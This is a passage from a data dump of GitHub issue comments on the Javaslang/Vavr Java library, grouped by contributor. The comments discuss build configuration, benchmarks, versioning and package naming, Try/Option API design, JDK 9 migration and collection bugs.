tagging/versions. You can run git from Gradle and read the tags of the HEAD version. Then, if the tag is present, use it as a version name of the artifact. If there are no tags, then take get the branch name, add -SNAPSHOT to it and deploy.\nI may be a little tricky to make it work with CI, but nothing one can't implement.\nRegarding module builds in Gradle. I don't get what the problem is. Modules must be named accordingly, and the vcsUrl property set for everyone. You can configure publishing in the parent build.gradle.\nIf it can wait one more week, I would be happy to implement it (after my vacation:-)).. Immutable LinkedHashMap can be implemenented, but I do not think that a persistent collection can be used for the list. Unlinke mutable linked lists, which can be unlinked/relinked in O(1) if we have a reference to the node, immutable linked lists cannot be updated in the middle without rebuilding the whole structure after the insertion point. So basically, to achieve O(1) we need a persistent data structure, which can be updated in O(1) and I do not know any :)\n. ",
    "anubliss": "Hi, can you please let me know how to achieve the opposite requirement of this?\nI would like to reset the order when I remove and insert the same key with different values.. ",
    "rdegnan": "javaslang.collection.ArrayBenchmark#update shows substantial improvement:\nBefore:\nArrayBenchmark  Update      slang_persistent          10      5       842,556.65  \u00b1    15.81%   ops/s        0.03\u00d7                                              0.09\u00d7\nArrayBenchmark  Update      slang_persistent         100      5        10,944.34  \u00b1    10.34%   ops/s        0.00\u00d7                                              0.01\u00d7\nArrayBenchmark  Update      slang_persistent        1000      5           147.66  \u00b1    11.24%   ops/s        0.00\u00d7                                              0.00\u00d7\nAfter:\nArrayBenchmark  Update      slang_persistent          10      5     5,389,360.02  \u00b1    72.03%   ops/s        0.18\u00d7                                              0.54\u00d7\nArrayBenchmark  Update      slang_persistent         100      5       162,789.41  \u00b1     7.09%   ops/s        0.04\u00d7                                              0.16\u00d7\nArrayBenchmark  Update      slang_persistent        1000      5         1,718.15  \u00b1     5.96%   ops/s        0.00\u00d7                                              0.02\u00d7. Great! I will use that.. Since we already know this is an arraylist, calling toArray directly avoids creating an IterableWithSize merely to call toArray on it -- probably a micro-optimization, but.... ",
    "oehme": "Gradle has no \"fatJar\" task, so I'm not sure what you are referring to. Gradle's Jar task uses UTF-8 for metadata (file name) encoding, because that is what the JVM expects. Sounds like you are using some community plugin which uses the system encoding instead. \nYou should not have to mess with the file encoding system property. . > Did you try systemProp.sun.jnu.encoding=UTF-8?\nIf you have to mess with these settings, then there is a bug. This should not be an acceptable solution. We should not promote such workarounds and instead work to fix the root cause to improve everyone user's life. Please let us know if you are experiencing such problems with Gradle's core APIs. I've created an issue for this.\n@aryaKetan Thank you for the example. The problem is not in the Jar task, but in how Gradle expands zips using the zipTree method.. ",
    "aryaKetan": "@oehme : We have written this task : \ntask fatJar(type: Jar) {\n    manifest {\n        attributes 'Implementation-Title': project.name,\n                'Implementation-Version': version,\n                'Main-Class': project.mainClassName\n    }\n    archiveName project.name + \".jar\"\n    zip64=true\n    baseName = project.name\n    from { configurations.compile.collect { it.isDirectory() ? it : zipTree(it) } }\n    with jar\n}\nIn this, during zipTree while copying the \u03bbMemoized.class , I am getting the above error.  \nI added gradle.properties with content \nsystemProp.file.encoding=UTF-8\nStill, same error. \nWill try to set JAVA OPTS now.. ",
    "devinrsmith": "I see now that patch exists, but has slightly different semantics than removeAt(ix).insert(ix, value). (It looks like patch silently coerces out of bounds indices.) I think replaceAt still has value!. Ha!\nNot sure how I missed that... it's a large interface, but still...\nThanks!. I think the semantics and API interface could be pretty straightforward:\n[rotate|shift]Right(n) = takeRight(n % len).appendAll(dropRight(n % len))\n[rotate|shift]Left(n) = drop(n % len).appendAll(take(n % len))\n(Might need some special handling when n < 0, or limit to n >= 0)\nI'm not sure how the library prefers to handle \"out of bounds\", and this method could limit 0 <= n < len and get rid of the remainder op if necessary.. ",
    "victor-mejia": "Thanks @ruslansennov clear enough with references explanations.\nRegards.. ",
    "pasku": "@ggalmazor Any ideas on how to solve this issue?. ",
    "anaumidis": "Maybe it'll be better to use Duration here.. ",
    "davinkevin": "I'm really waiting this functionality to migrate my codebase to V\u028cvr \ud83d\ude09 . I found a potential solution, but it requires to add information to help the compiler : \njava\n    public void shouldMapFromTuplesReturnNotNull() {\n        Map<String, Object> map = API.<String, Object>Map(\n                Tuple(\"Foo\", new Object()),\n                Tuple(\"Foo\", new Object()),\n                Tuple(\"Foo\", new Object()),\n                Tuple(\"Foo\", new Object())\n        );\n        assertThat(map).isNotNull();\n    }\nYou can find the code with modification here and the travis build here. ",
    "densmnko": "@danieldietrich Thanks a lot for your investigation. It seems that a problem was not in javaslang at all. After disabling \"Fluid\" IDEA plugin all my tests passed without any leaks... \nSorry for bothering, and thanks a lot. \n. ",
    "DouglasBrunner": "Thanks for the suggestion Daniel. That was the exact solution.\nI'll leave some documentation for future readers who may come across this.\nFirstly, there is a Spring blog post that explains how to use Jackson modules in SpringBoot.\nAdd the Javaslang dependencies to your POM file.\n    <dependency>\n    <groupId>io.javaslang</groupId>\n    <artifactId>javaslang</artifactId>\n    <version>2.0.5</version>\n    </dependency>\n    <dependency>\n        <groupId>io.javaslang</groupId>\n        <artifactId>javaslang-jackson</artifactId>\n        <version>2.0.5</version>\n    </dependency>\n\nRegister the module in your application\n@SpringBootApplication\npublic class DemoApplication {\n\n    public static void main(String[] args) {\n        SpringApplication.run(DemoApplication.class, args);\n    }\n\n    @Bean\n    public Module jacksonBuilder() {\n        return new JavaslangModule();\n    }\n\n}\n\nReturn Javaslang objects directly in the controller. Nice and concise.\n@RestController\n@RequestMapping(\"/javaslang\")\npublic final class DemoController {\n\n    @RequestMapping(value=\"list\", method = RequestMethod.GET, produces = MediaType.APPLICATION_JSON_VALUE)\n    @ResponseBody\n    public List<String> returnList() {\n        return List.of(\"Bob\", \"Alice\");\n    }\n\n    @RequestMapping(value=\"either\", method = RequestMethod.GET, produces = MediaType.APPLICATION_JSON_VALUE)\n    @ResponseBody\n    public Either<String, Boolean> returnLEither() {\n        Either<String, Boolean> result = Either.left(\"Bob\");\n        return result;\n    }\n\n}.\n",
    "lbialy": "Great, thanks a lot! Will this fix be included in next patch version or 2.1.0?. ",
    "NataliiaPrivezentseva": "@danieldietrich hi! Why this issue is still open? Maybe we need to make sure that all methods take, takeRight, drop, dropRight were optimized?. @danieldietrich, @valery1707 Could you please look at changes I've made?. @danieldietrich, I understand your decision. I don't like code duplication either.. Thanks for comments! I'll revert those two methods. However it won't heal the problem with test (it is in Vector.ofAll() method). I have an idea, how to fix it. . It was not done on purpose, I used Ctrl + Alt + L and these changes were performed. I didn't khow that! Thanks! I'll change my code. Thank you, I'll change this. @valery1707 do you think I should change it back?. ",
    "skestle": "Somehow I messed this up and made #1913 . Your first comment seems like it's in the documentation, but I didn't see it. That's way better than mine ;). Yes. If my application uses javaslang v2 and one of my dependencies (or co-deployed applications) upgrades to javaslang v3, then my whole app breaks. Nothing I can do about it because (presumably) some methods and classes fail to exist.\nApache's commons lang shows that it's not specific to our company - it's just rare to find a library that really cares about compatibility (in a world that's presumed to entirely have moved to continuous deployment to production).\nBesides, even in \"modern\" development; as soon as I want to upgrade a dependency and it relies on javaslang, I have no choice but to invest immediate time refactoring my usage of javaslang.\nYou might as well move this source repo to subversion (by parallel). Or never use git fetch - only ever git pull.. ... and I'm don't mind about a proof of compatibility. The Semantic Versioning statement does give us assurance that breaking it is a bug, and we can expect to be able to fix it and contribute back.. I completely understand that - I used to feel this sort of tension. But I'm now very much of the position that granting version flexibility to API users is of far more value than keeping a \"tidy\" package structure.\nRegardless of the outcome of this ticket, I'll achieve the outcomes I want (we've made hibernate3 retain full backwards compatibility!); but it's definitely worth my effort to avoid an extra process that somebody could stuff up in production.\nPerhaps this scenario would help a decision:\nI want to use Try in our company's core services, but we have Transactional annotations on our (clustered) services. These will need to be updated to handle failed Try instances that cross a transaction boundary (rather more complicated than raw Exception handling).\nHow comfortable would you be in promoting javaslang to me without major version repackaging?\nNB: The answer cannot be \"absolutely\" in any situation, since bugs will be introduced and our verification is mandatory (you can never guarantee compatibility as you say). But given the chance that somebody could just drop in an updated jar... (I'm thinking in a single server installation, but even in clusters incredible things happen). Great! \nOff Topic (about OSGi and classloading)?:\n@nfekete - our applications are hosted on an OSGi environment - and it cannot be a panacea for binary compatibility as might be naively interpreted.\nWe've disabled version ranges and have gone with simple version minimums - it's hard enough for the average dev to understand how to use and diagnose bundle classloader issues as they are without introducing variant classes that accidentally leak into service APIs / serialisation etc.\nI'm wanting something as declarative as Try to be able to be all through the APIs - a downstream bundle might need to consume to APIs that use different versions of javaslang.\nAlso, I'd say the most advanced I've seen is LightBend's Reactive Platform with ConductR - I was interested when a webcast mentioned OSGi https://www.youtube.com/watch?v=JEPHSdHHWnE&feature=youtu.be&t=2776. > That would solve the problem (for now)\nI've since realised that for me, the solution only entirely solves the problem for version 2. I can't recommend adoption of a stable 3 release unless there's a commitment to repackaging non-binary-compatible changes. \n4 years is a short time in enterprise. I'm in the process of upgrading one application's libraries from ~2007 - if it had been in a shared container...\nAnyhow, there's time for that discussion quite a bit later. Food for thought; I'll check up when v3 is released ;).. Well, you didn't have to look forward long \ud83d\ude1b .\nSince we're now at 0.9, can I propose io.vavr.v1 etc?\nAt v2 you could move the entire package, or move only compatibility-broken classes as they change.\nOtherwise I think I need to fix to javaslang 2.0 (presuming that bugfixes will stay in the same package)\nI'm getting more confused about this not being implemented. vavr is a \"core\" library (much like the apache libs that never change - see org.apache.commons.lang3 as an example).\n\nA depends on vavr 1\nB depends on vavr 2\nI use latest A and B. A fails.\n\nLet alone my application that suddenly has a runtime failure because of an uncommonly used part of my application relies on an API that has changed, and I'd just upgraded. \"Forcing\" a package change is far more preferable to finding it later in dev or testing as it gives transparency of options (as well as not being a force - each change can be evaluated separately since v1 and v2 could live together indefinitely).\n@nfekete - as an indirect answer to your \"how many libraries do you depend on...\" basic question: have you ever developed with scala (that this is based on)? Particularly around the 0.9, 0.10 (from memory) releases? \nThe inability to consistently use basic libraries until all have upgraded to the version you want to move to (if they ever do).\nPerhaps the existence of vavr is testament to the fact that larger organisations can't easily embrace [scala] technology if it's not backwards compatible.\nFinal thought: vavr is (presumably) intended to be an API that helps developer's lives in a way they expect to in java - the API is stable. How can a functional library publish an im-pure API? (where the io.vavr package is an argument to my application function[ality]). @nfekete \n\nTo me, the main conclusion to these points is, that you cannot really have a public API in your app based on mixed incompatible versions of the library (or any library whatsoever)\n\nThat's it in a nutshell. That's why Java never changes (except to create new functionality in new packages), scala is only adopted in modern enterprises with a full automated test suite, and that any API that cares about it's (perhaps) larger/monolith users versions their packages (apache, not google).\nREST Apis are versioned (if you want them to be long term an successful).\nI'm not sure if you've dealt with OSGi on a large scale in a large organisation. Version reference ranges lead to large scale problems across a large deployment stack that overwhelms the average developer. We only use minimums and guarantee backward compatibility. It's better than crazy binary API errors.\nOur company has 400+ developers and over 3000 modules, many inactive (much like internet modules). If we change, we need to do manual QA to meet industry regulations.\nWithout this change, upgrading to vavr 2.0 across the organisation would probably cost somewhere in the range of $500000 (if 10% of our modules used it) - being a dev, I'm probably $1m out.\nFor everybody else, they get formal notification of the change and an ability to opt-in at their timing.\nMy A, B, C example was not so much for my companies modules, so much as the normal world of development that (I would have thought most) devs are subject to with maven/ivy/gradle/sbt - seriously, how many devs use OSGi and classpath containers? <<10% of the devs we interview have had any exposure to it.\nI really don't understand why I'm still having to reply - there's a reason we have terms of jar/dll/dependency hell. \nAPI development is about making user's lives better and consistently so. It can never be about what we wish the world were like. The API provider should contort their view of the world so that the user has magic that just works (Scala taught me that learning it is easy, because the really smart people are on the other side of that API making ridiculously \"over-engineered\" and complex solutions)\nAPI versioning is a standard practice in development environments where there's no universal way of separating them (Project Jigsaw?). When vavr requires Java 9 or 10 or 11 or whatever, then this can be ignored. . Oh - all I mean is at 1.x.y we have io.vavr.v1 which is always compatible (according to the md documents).\nAt 2.0.0 the package is simply renamed to io.vavr.v2.\nEach module can elect the major API they wish (or mix the 2 - most likely when upstream libs use vavr). I guess to allow the dependency resolvers, these would have to be the module identifiers.\nActually, that reminds me of the more annoying problem: I'm using an OSS lib that uses vavr 1, and I'm now stuck at 1 unless I want to go through the process of trying to get a PR into a lib and get it released, or fork or...\nWe can't consider OSGi a solution IMO - in my experience that (or any other mention of \"classloader\") excludes over 90% of devs - even seniors these days.. @nfekete\n\nyou either don't need to pass around vavr types across module boundaries or you'll need to create glue code which translates between the API versions\n\nOr alternatively, you get to automatically pass vavr types across module boundaries, but one of the module breaks because it hasn't actually upgraded to the incompatible code.\nSo no change whether we version packages or not.\n@danieldietrich \n\nWe should not try to solve the versioning problem in Vavr. It is the job of (build) tools, not the job of a library.\n\nYes, it is the job of build tools, but build tools have not done it for 2 decades, and still seem years off. Do we leave this problem broken for the 5-10 years we're going to be waiting?\nEven the scala compiler has not yet achieved this goal.\n\nIt is a general problem that can\u2019t be healed by just fixing the namespaces of one library\n\nI'm not asking you to heal the problem, I'm asking you to not make it worse.\nReally, out of the 100 or so OSS bundles we import, only google guava and hibernate need serious fixing as far as I know. Guava we can namespace; hibernate has to be patched so that it retains compatibility with older versions.\nPerhaps it's just because OSS Java effectively was Apache, and they really care about this issue.\n\nWe need a build tools and runtimes\n\nSo since runtimes are going to be 5++ years, we're left with build tools. Perhaps it's just as simple as doing a dual build. Have the general one that forces application wide simultaneous upgrades (at minimum) and causes transitive mayhem, and another that starts with a package rename based on the major version\nI'll look to contribute something in this form in a month or few; for the moment, we'll use Javaslang.\nHowever - I'll disagree with \n\nTrying to solve it will lead to new problems, as @nfekete described.\n\nI did not notice @nfekete raise any new problems; just inconveniences. I think convenience is a brilliant thing to sacrifice if it means elimination of a whole class of bugs, and casting away any expectation that major upgrades \"will just work\".\nThis problem is solvable for the problem of software quality, as has been demonstrated by apache. The cost is inconvenience; most of which you've subscribed to anyhow with Semantic Versioning - this is just the ultimate step.. > a huge price to pay for it, specifically all vavr library users would be forced to organize imports throughout the project when migrating, instead of a simple recompile and occasional source fixes where there might be incompatibility.\nThankyou for clarifying this position. This absolutely baffles me. \n\"A huge price\"? Select all projects, organise imports. 10 seconds? Faster than the simplest incompatibility fix. Even if you don't use an IDE, figuring out the grep command would be about 1 min.\n\"A simple recompile\"? You don't want everybody using vavr? I would if I made this project. Which means recompilation is not simple, because it involves all your dependencies that use vavr.\nSomeone will believe you and do as you suggest in a corporate environment, release a milestone, and have broken something somewhere else.\nThis can easily waste a whole day if it gets to testing.\n1 user that hits my problem that I describe badly enough could outweigh the entirety of the community (certainly if the community is less than 10000) having to do 1 min of work (on top of the minutes they've already spent wanting the upgrade).\nAt our company, we thought guava was \"the new apache commons\" and then:\n\nI team decided they wanted v18 stuff\nThey managed to test their full stack and get through multiple milestones to product release\nOn a client site (I believe), the product was integrated with one of the options.\nStuff broke - badly.\n\nIt must have cost 5 figures to fix it - even with the fast resolution and re-releases we had. This is what your decision can cost.\nBesides, you've misrepresented the world I present. My solution forces zero action.\n\nImport vavr 2\nUse it in the class you want.\nDone - and you can tell your QA dept that only your functionality has changed; no need for system-wide partial regression (as would be required if other modules could be affected)\n\nWith versions, you're not forcing any user, or module, or class to take anything they don't subscribe to.\nAs you say, I have options to repackage. I'm arguing this for that user (ha! only one that would make this mistake) that don't understand the implications.\nDeclare your API - be proud when you've got something that's different enough that it requires a different name. Make the major vavr API versions pure functions.\nHey, there's nothing stopping you from doing a JarJar or Shade to make an unsafe lib for those who really want it (here be dragons) :p.. Thanks @nfekete - I hadn't considered that.\nBoth issues can be produced by trying to do the \"simple thing\" after update - one type of bug through transient dependencies of the same package, and another by accidental incorrect use of IDE imports for different package.\nI still think a find/replace is a more \"aware\" solution, and a better default. Especially since zero work needs to be done when adding v2 (as opposed to removing v1 at the same time).\nI think that's it for me. I'm happy that my points are understood now. If I haven't been convincing enough then close it; I'll do something when vavr's sufficiently more interesting than javaslang for me to spend time.. If the second option is chosen, then Option could change collect to be return flatMap(partialFunction.lift())...\nUpdated: brain fade with previous comment version. I think that's why I'd like a construct - so it's not constrained by compatibility with Option or Try.\nI don't want my Success<Some<T>> to become a <Success<None<U>>>. I need to know that the conversion from T to U is a Failure.\nSuccess<None<U>> implies None<T> as well.\nSo I want TryOptional.map(T -> U) that (semantically):\n Success<Some<T>> -> Success<Some<U>> - executed\n Success<None<T>> -> Success<None<U>>\n* Failure<T> - > Failure<U>\nI don't know about TryOptional.flatMap, but as a specialised type, I don't expect it needs to be fully defined monadically. I'd expect\n Try<U> flatMap(T -> Try<U>)\n TryOptional<U> flatMap(T -> TryOptional<U>)\nPerhaps only the second is valid since this construct would be able to be deconstructed via toOption and Try<Option<T>> to/asTry - perhaps toTry().flatMap(Value::toTry) would be the basic form.... Yes that looks good. I'd like mapOrThrow(CheckedFunction1<T,U>) and mapTry(Function1<T, Try<U>) (needs better name) if possible.\nAs for TryOptional, I'm happy with not having it if possible - but I'd challenge \"new types for every new use-case\" in this instance. Java's general method declaration problems are null handling/dereferencing and checked/thrown exceptions.\ni.e. returning null or throwing exceptions are basic java constructs we'd like to avoid (and are part of the same method definition), and so having a specific type to do a non-nested generic conversion has some value.\ne.g. T foo() throws Bar { return null; } could map to TryOptional<T> foo() instead of Try<Optional<T>> foo().\nOn the other hand, I'm very happy with Java 8's generic inference - it's been able to do everything I want it to so far (with a bit of help with type definitions, but no casting).. Set as Predicate example:\n```\nValue value;\nSet filterValues;\nvalue.filter(filterValues);\n```\nPredicate as function code example:\n```\nValue value;\nSet filterValues;\nvalue.filter(filterValues.compose(T::getR));\n```. I've (quickly) looked over #2249 and can't see how this ticket's primary proposition has been discussed (I could have missed it)\nSet as a Predicate was an example on the second point, not really at all what this was about.\nI'd just want to clarify that the compose function has little merit.. On a similar question of merit - but a bit off topic; Function1 has constant(R), but not suppliedWith(Function0) - should it? (I would have found it useful today)\ni.e. Is it worth creating a ticket for, or is it (perhaps similarly) not useful enough.. Updated and removed \"semantic\". It was a re-use of the \"semantic\" under \"3. Behavioral\" backwards compatibility item.\nUpdate \"for major\" to \"within major\" since I wrote it wrong ;). (I'm into  definitions and...) I'm not sure this is a fantastic example (for my use case anyhow) - but quite possibly is for this change...\ni -> Option.of(1/i) is really a PartialFunction<Int, Int>. I'd be writing this as Option.some(0).flatMap(reciprocalFunction.lift()). I'm not sure there's a really valid semantic use case for this function - certainly it's a shorter path, but I'm not sure that's always a good thing.\nflatMapTry(function) is the same as flatMap(t -> Try.of(() -> function.apply(t)).toOption()) right? Or rather flatMap(t --> function.liftTry().apply(t).toOption()), or map(liftTry(function)).flatMap(Try::toOption)\nSeems like this change could be handy, but I'd want to see the equivalent expansion in the docs. . ",
    "rkraneis": "@nfekete How do you want to tackle null (and possibly other checks)? A good tool seems to be the checker framework which supports basically arbitrary checks (e.g. purity) besides nullness. The good thing (or bad, depending on your viewpoint) here is, that the checks are done during the build (and will fail it) and not only exist as hints in the IDE (an eclipse plugin also exists, never used it though). It also lets you add annotated shims for not annotated libraries (e.g. the jdk).\nEdit: this might be an issue :-/\n  . (as this issue is already hijacked anyway) @nfekete  How do you want to tackle null (and possibly other checks)? A good tool seems to be the checker framework which supports basically arbitrary checks (e.g. purity) besides nullness.. @nfekete yes, I moved that over (and extended it a bit). We can take the discussion there.. Well, first and second ... eighth are still ok, but what's with seventeenth and twentyfirst (if max_arity ever increased)? As much as I like descriptive names, t.first, t.second, t.third don't stand out as well as t._1, t._2, t._3 (or t.e1, t.e2, t.e3). Having getters and setters would only make sense if one wanted to enforce this as a contract in an interface.  FWIW t.e1, t.getE1, t.mapE1 would look ok-ish (I'd prefer e (element) to v (value) as that is more in line with usage in the collection API) .... Well, scala doesn't only go up to eight, or eleven, it goes up to 22 ;-P But yes, using those kinds of tuples should be reserved to clojure.. ",
    "m-titov": "https://github.com/uber/NullAway. Yes. Like that. Because why do we need it? It would be more useful to have garanted not null elements collection.. https://github.com/google/guava/wiki/UsingAndAvoidingNullExplained. ` Exceptions are an anathema to functional programming as they are side-effects by design\nOk. Thanks. You probably right. Maybe exceptions are an anathema to functional programming. But I have never faced with null values in collections during long time. I think using null in collections is bad design of application. That's why currently I prefer guava to vavr.\n\nCan we close the ticket?\nYes. Thank you for your answer.. \n",
    "utkarshdbodake": "@Vivek-Patil @danieldietrich  Makes sense.. ",
    "durron597": "A few thoughts: I would recommend not using toTry here, instead preferring getValue().get() as that actually captures the semantics of the situation.\nRegardless, what doesn't violate Liskov here would be to have the NoSuchElementException in Future actually encapsulate the exception itself, e.g. new NoSuchElementException(\"get on failed future\", innerException); Theoretically then one could use recover or other semantics here or at the very least have a more informative log message than NoSuchElementException that squashes the actual failure.. I started writing an answer this answer differently, but then I realized you have something that's fairly close to what I'm trying to get at: Lazy. Perhaps using Lazy.of(() -> myObj) would work in many cases, but I'd have to wrap lots of things in it using Lazy.of instead .getLazy\n\nStepping back from that for a moment, consider code like:\npublic Option<Quux> chainSomeMonads(Option<Foo> foo) {\n   return foo.flatMap(this::toBar)\n                   .flatMap(this::toBaz)\n                   .flatMap(this::toQuux);\n}\n\nBut what if, in my use case, I know I'm going to have an object every single time? With Value, you could certainly do:\npublic Value<Quux> chainSomeMonads(Value<Foo> foo) {\n   return foo.flatMap(this::toBar)\n                   .flatMap(this::toBaz)\n                   .flatMap(this::toQuux);\n}\n\nWell, actually, I can't, because:\nflatMap signatures are manifold and have to be declared by subclasses of Value.\n\nBut hopefully you see what I'm driving at? This would be a way to do it, obviously:\npublic Quux chainSomeMonadsSortOf(Foo foo) {\n    return toQuux(toBaz(toBar(foo)));\n}\n\nBut it doesn't match the style of the rest of the syntactic flavor. Also I can't easily call toList or toMap or any of the other nice things Value provides.\nIn my ideal ideal world, Object would extend Value. But it doesn't, so we have to hack around it.\nThere are of course lots of ways to do things like what I'm driving at today. For example, I can call Lazy.of(() -> foo). I can also do Array.from(T), as pointed out by @nfekete. But none of these have the syntactic elegance that makes Vavr such a large improvement over vanilla Java. In other words, this isn't really a \"feature request\" in the sense that I'm asking to be able to do something new that the library can't already do. I'm asking for a syntactic sugar that could make some code cleaner in many cases.. @danieldietrich now that we've hashed it out, I agree with closing the ticket as won't-fix. Very glad we had the conversation though.. ",
    "Vivek-Patil": "@danieldietrich I am using the 2.1.0-alpha as you said because of the await() functionality on the Future<T> which I needed the most in my code. I am using Intellij Idea 2017 as my IDE. If I switch to the 2.0.5 I have to replace my code where await() on Future<T> does not return Future<T>.I know there is a workaround for it but just wanted that functionality so used the latest version. What do you suggest ?\n. @danieldietrich Also why is it such that I have to replace toOption() with toTry() ? It should also work on even if I return atoOption(), but it takes me to theorElse()` with one not using the supplier. Is it something because of the javaslang latest alpha version ?. @danieldietrich Got it. You replaced the function provided in the orElse block to a explicit function argument which I did not notice as it takes a supplier. Thanks for your immediate help.\nThanks\nVivek. ",
    "fagossa": "Perhaps this is somehow related to Issue 1565.. @danieldietrich \ncombine is now a fluid append for the list containing our different Validation's.\npublic Builder<E, O> combine(Function<O, Validation<List<E>, O>> func) {\n    functions.add(func);\n    return this;\n}\nI really ment \n.apply(person)\nAnd this is probably the biggest flaw of this approach: you specify a T and the whole validation process is executed on that instance (e.g. an instance of Person).\n. ",
    "pli2014": "got it thks. ",
    "landawn": "For example, filter/map/flatMap/distinct/top/... Can these methods be defined/implemented in a basic abstract class? or move them to a separated interface, like Steam API to Collection in java.util? . Ok, thanks. ",
    "bhchandra": "Thank you for answering!. ",
    "grnadav": "Came across this today as the Try.Failure bit me with its handling of fatal exceptions.\nI expected it to handle all exceptions, and return with some sort of failure in any case.\nIn the meantime I implemented a util i now use as VavrUtils.Try.of() instead of Try.of() to catch fatal ex. and re-throw them inside runtime exceptions.\njava\npublic class VavrUtils {\n    public static class Try {\n        public static <T> io.vavr.control.Try<T> of(CheckedFunction0<? extends T> supplier) {\n            try {\n                return io.vavr.control.Try.success(supplier.apply());\n            } catch (Throwable e) {\n                return io.vavr.control.Try.failure(new RuntimeException(e));\n            }\n        }\n    }\n}\n. @danieldietrich i'm using a Try to get the result of a calculation of something I have zero control over, but the control flow needs to handle all cases of failure.\na thread interrupt for example is a common scenario which is legit, and needs to be handled.\nit is a cache obj, which receives the load fn as param, and the cache itself might trigger an interrupt on the fn's thread.\n. ",
    "kittylyst": "I do not believe so. What todays experiments have shown me leads me to think that there is no way that a warnings == fatal project can have a source base that compiles cleanly under both JDK 8 & 9. It seems that the javac compiler is much more strongly-conforming in 9 than 8.. OK, here's a breakdown of what's in the PR, so you know which bits you might want:\n.gitignore - just ignore vi swap files : SAFE for both 8 & 9\nfile renames & module-info.java : only needed if having a fork or branch that is JDK 9\npom.xml - only needed if having a fork or branch that is JDK 9. Probably a good idea to move to Scala 2.12 soon though, even for Java 8\nChanges to the GwtIncompatible.java files - SAFE for both 8 & 9 : not needed for 8 but the current situation is actually incorrect and the 9 compiler exposes it.\nio/vavr/Lazy.java - NOT SAFE to backport to 8. 8 is actually incorrect and the 9 compiler exposes it.\nio/vavr/AssertionsExtensions.java : SAFE for both 8 & 9. 9 changes behaviour so that this method will emit a deprecation warning whereas 8 won't\nio/vavr/MatchTest.java - I have no idea what the correct form for this for 9 is. The current 8 code is wrong, and relies on a type inferencing bug in javac. I could not find a correct form for 9, and exposed a javac bug in 9 when trying to forward port it. The current code is unsafe and almost certainly doesn't mean what you think it does.\nI know this isn't a great story for you, but please consider how you might support 9 going forwards. Vavr is a great project, and as it has so few dependencies, it could be made into a set of explicit modules, which would be great to see. Thanks for all the work so far!. Hi Daniel - thanks for the comments on the PR. We are making progress on this - including having collaborated to help get a version of maven-compiler-plugin (I think it will be 3.6.2) that works with 9. Currently, having problems with maven-bundle-plugin. The problem seems to be in bndtools - and some folk from the OSGi community are helping us look at the issue.\nI think the current issue we're facing is related to this thread - https://github.com/vavr-io/vavr/issues/1225 - is there a workaround that doesn't involve using the maven-bundle-plugin ? - as apparently it will be a while before it gets updated to handle JDK 9.\nI started a thread about this here: https://groups.google.com/forum/#!forum/bndtools-users - maybe you could come & join?\nWill respond to the API and other points in a separate comment - getting the build working is my top priority because of the time-sensitivity.\n. Just to follow up on this: \nThere are now fixes in place for maven-compiler-plugin and BndTools that have progressed the build. However, the test cases are still failing to compile. The issue appears to be within Vavr itself, to do with the generated test cases. \nAs I'm not too familiar with the source generation that Vavr does yet - if someone has some cycles to help me look at this, it would be greatly appreciated.. ",
    "flopezlasanta": "Possibly duplicate of https://github.com/vavr-io/vavr/issues/1263 ?. ",
    "camory": "Wow !!! So quik that I did not your answer !! \nand it works !! \nThanks you for your reactivity and for your great work. ",
    "ummels": "Thanks for the info. I guess while (true) { Thread.sleep(100L); } would be a better example.. Yes, that would work, although I'm wondering why Scala is sticking to its implementation of hashCode, which does not terminate for infinite streams as well.. Or rather it terminates with a heap overflow.... it is not only Stream.sortBy that is affected, but also Vector.sortBy etc. for example if you want to sort a vector of type Vector<Stream<T>>.  So one would need to disable memoization depending on the element type, not on the sequence type.. Here is a shorter/more readable example:\nfinal RedBlackTree<Integer> t1 =\n        RedBlackTree.ofAll(Integer::compare, Vector.of(8, 14, 0, 7, 9, 3));\nfinal RedBlackTree<Integer> t2 =\n        RedBlackTree.ofAll(Integer::compare, Vector.of(7, 9, 14, 6, 0, 5, 11, 10, 4, 12, 8, 13));\nfinal RedBlackTree<Integer> t3 =\n        RedBlackTree.ofAll(Integer::compare, Vector.of(1, 2));\nassertThat(t1.intersection(t2).intersection(t3).isEmpty());\nOn the other hand, this test passes correctly:\nassertThat(t1.intersection(t2.intersection(t3)).isEmpty());. Unfortunately, trading intersection for difference doesn't work since difference has the same problem:\nRedBlackTree<Integer> t1 = RedBlackTree.ofAll(Integer::compare, List.of(20, 6, 8, 10, 15, -5, 14, 5, 9));\nRedBlackTree<Integer> t2 = RedBlackTree.ofAll(Integer::compare, List.of(19, 0, 9));\nRedBlackTree<Integer> t3 = RedBlackTree.of(Integer::compare, 0);\nassertThat(!t1.difference(t2).difference(t3).isEmpty());\n@roberterdin Good that you've found an example with two sets. With my generator, I have only been able to find examples involving three or more sets.\n. Okay. I was wondering because in the existing code I usually saw io.vavr.collection.Collections fully qualified.. Thanks!. ",
    "ahlusar1989": "Happy to @ruslansennov!. ",
    "rubenjgarcia": "I don't know why Java can`t infer the type \ud83d\ude44 \nThanks for your answer. ",
    "juanpavergara": "Hi @hamnis and @danieldietrich .\nI can see this change was merged on Jun 29, 2017 and the 0.9.2 tag was released on  Nov 24, 2017\nIs there a reason why this change is not present in the release?\nThank you!. Oh ok thank you for your reply @danieldietrich :)\nI was about to implement it and open a PR but then checked the source and realized @hamnis already did :)\n. ",
    "jangalinski": "a .... .tupled() does what I want. Sorry for the interruption!. Hi Daniel ... I know. impressive what you've done since then :+1: . ",
    "PascalSchumacher": "Hi Daniel,\nthanks for response.\nSorry for the lacking issue description.\nI  am really looking for is a method to check that no item of a collection matches a Predicate. The inverse of Value#exists method.\nSo you could (for example, not sure about the name) write:\nList.of(\"green\", \"red\"].nonExistent(color -> color.equals(\"yellow\"))\ninstead of:\n! List.of(\"green\", \"red\"].exists(color -> color.equals(\"yellow\")). Just a small improvement, that makes these warnings:\n[WARNING] The project io.vavr:vavr-parent:pom:1.0.0-SNAPSHOT uses prerequisites which is only intended for maven-plugin projects but not for non maven-plugin projects. For such purposes you should use the maven-enforcer-plugin. See https://maven.apache.org/enforcer/enforcer-rules/requireMavenVersion.html\n[WARNING] The project io.vavr:vavr-match:jar:1.0.0-SNAPSHOT uses prerequisites which is only intended for maven-plugin projects but not for non maven-plugin projects. For such purposes you should use the maven-enforcer-plugin. See https://maven.apache.org/enforcer/enforcer-rules/requireMavenVersion.html\n[WARNING] The project io.vavr:vavr:jar:1.0.0-SNAPSHOT uses prerequisites which is only intended for maven-plugin projects but not for non maven-plugin projects. For such purposes you should use the maven-enforcer-plugin. See https://maven.apache.org/enforcer/enforcer-rules/requireMavenVersion.html\n[WARNING] The project io.vavr:vavr-test:jar:1.0.0-SNAPSHOT uses prerequisites which is only intended for maven-plugin projects but not for non maven-plugin projects. For such 